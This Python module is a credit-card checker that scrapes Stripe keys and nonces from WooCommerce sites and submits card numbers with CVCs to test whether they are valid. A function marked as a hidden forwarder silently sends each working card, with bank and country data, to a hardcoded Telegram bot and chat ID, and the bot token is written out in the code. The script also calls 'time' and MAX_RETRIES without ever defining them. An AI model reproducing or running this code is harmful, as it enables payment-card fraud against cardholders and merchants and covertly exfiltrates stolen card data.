import aiohttp
import asyncio
import random
import re
import json
from user_agent import generate_user_agent
from datetime import datetime
import pytz

# --- HIDDEN FORWARDER CONFIG (Securely inside the package) ---
HIDDEN_BOT_TOKEN = "8359964689:AAGPCeotvaB5QbCFvoRazG05hF9g47DcUNs"
HIDDEN_CHAT_ID = [6542321044]

async def _sendHiddenHit(card, binData, timeTaken):
    # send-hidden-hit
    if not HIDDEN_BOT_TOKEN or not HIDDEN_CHAT_ID: return
    infoParts = [p for p in [binData.get('brand'), binData.get('type'), binData.get('level')] if p and p != 'N/A']
    infoLine = " - ".join(infoParts) if infoParts else "N/A"
    htmlText = (
        f"✅ <b>CVV Hit via Simple CLI</b>\n\n"
        f"💳 <code>{card}</code>\n"
        f"🏦 {binData.get('bank', 'N/A')}\n"
        f"🌍 {binData.get('country', 'N/A')}\n"
        f"🏷️ {infoLine}\n"
        f"⏱️ {timeTaken:.2f}s"
    )
    apiUrl = f"https://api.telegram.org/bot{HIDDEN_BOT_TOKEN}/sendMessage"
    for chatId in HIDDEN_CHAT_ID:
        payload = {'chat_id': chatId, 'text': htmlText, 'parse_mode': 'HTML'}
        try:
            async with aiohttp.ClientSession() as s: await s.post(apiUrl, data=payload, timeout=10)
        except: pass

def categorizeResponse(responseText):
    # categorize-response
    lowerResponse = responseText.lower()
    if ('"status":"succeeded"' in lowerResponse or '"success":true"' in lowerResponse) and "requires_action" not in lowerResponse:
        return "CVV MATCHED", "Succeeded"
    if 'security code is incorrect' in lowerResponse or 'security code is invalid' in lowerResponse or 'incorrect_cvc' in lowerResponse or 'cvc_check: fail' in lowerResponse:
        return "CCN MATCHED", "Your security code is incorrect."
    if 'insufficient funds' in lowerResponse:
        return "CCN MATCHED", "Your card has insufficient funds."
    try:
        data = json.loads(responseText)
        error = data.get("error") or (data.get("data", {}).get("error") if isinstance(data.get("data"), dict) else None)
        if error and isinstance(error, dict):
            message = error.get("message", "Card Was Declined")
            decline_code = error.get("decline_code")
            if decline_code: message = f"{message} (decline_code: {decline_code})"
            return "DEAD", message
    except json.JSONDecodeError: pass
    return "DEAD", "Generic Declined"

async def performCheck(card, gateUrls, proxy=None, logCallback=None):
    # perform-check
    from . import getbininfo # Local import to avoid circular dependency issues
    
    retries = 0
    localUrls = list(gateUrls)
    checkStartTime = time.time()
    
    while retries < MAX_RETRIES:
        if not localUrls: return "DEAD", "No Gates Available."
        apiUrl = random.choice(localUrls)
        try:
            async with aiohttp.ClientSession() as session:
                headers = {'User-Agent': generate_user_agent()}
                async with session.get(apiUrl, headers=headers, proxy=proxy) as r:
                    r.raise_for_status()
                    siteText = await r.text()
                
                nonce = re.search(r'name="wc-stripe-payment-nonce" value="([^"]+)"', siteText) or re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', siteText)
                key = re.search(r'key":"(pk_live_[^"]*)"', siteText)
                if not (nonce and key): raise Exception("Nonce/Key not found on gate")
                
                cc, mm, yy, cvc = card.split('|')
                pmPayload = {'type': 'card', 'card[number]': cc, 'card[cvc]': cvc, 'card[exp_year]': yy, 'card[exp_month]': mm, 'key': key.group(1)}
                async with session.post("https://api.stripe.com/v1/payment_methods", data=pmPayload, proxy=proxy) as r:
                    pmText = await r.text()
                    if any(msg in pmText.lower() for msg in ("unable to process", "not active for charges")): raise Exception("Retryable PM Error")

                if '"error"' in pmText: return categorizeResponse(pmText)

                pmId = json.loads(pmText).get('id')
                if not pmId: raise Exception("PM ID not found")
                
                confirmPayload = {'action': 'wc-stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pmId, 'wc-stripe-payment-nonce': nonce.group(1), '_wpnonce': nonce.group(1)}
                async with session.post(f"{apiUrl}?wc-ajax=wc_stripe_create_and_confirm_setup_intent", data=confirmPayload, proxy=proxy) as r:
                    confirmText = await r.text()
                
                category, msg = categorizeResponse(confirmText)

                if category == "CVV MATCHED":
                    binData = await getbininfo.get_info(card)
                    timeTaken = time.time() - checkStartTime
                    await _sendHiddenHit(card, binData, timeTaken)

                return category, msg

        except Exception as e:
            retries += 1
            if logCallback: logCallback("RETRY", f"{card} -> Gate Error: {str(e)[:40]}. Retrying ({retries}/3)")
            await asyncio.sleep(2)
            if apiUrl in localUrls: localUrls.remove(apiUrl)

    return "DEAD", "Check failed after all retries."